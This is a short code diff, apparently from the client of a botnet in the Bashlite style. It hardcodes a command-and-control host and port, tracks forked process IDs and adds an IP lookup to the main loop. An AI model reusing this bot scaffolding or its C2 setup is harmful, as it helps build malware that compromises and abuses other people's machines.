@@ -19,27 +19,15 @@
 int mainCommSock = 0;
 char *server = "self.1isp.cc";
 int port = 21337;
-uint32_t *pids;
-uint64_t numpids = 0;
 extern char uuid[32];
-
-int listFork()
-{
-	uint32_t parent, *newpids, i;
-	parent = fork();
-	if (parent <= 0) return parent;
-	numpids++;
-	newpids = (uint32_t*)malloc((numpids + 1) * 4);
-	for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
-	newpids[numpids - 1] = parent;
-	free(pids);
-	pids = newpids;
-	return parent;
-}
+extern uint32_t *pids;
+extern uint32_t numpids;
 
 int main(int argc, char **argv)
 {
     generate_uuid();
+    getOurIP();
+	//printf("MAC: %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n", macAddress[0], macAddress[1], macAddress[2], macAddress[3], macAddress[4], macAddress[5]);
 
     //daemonize();
     while ( 1 )
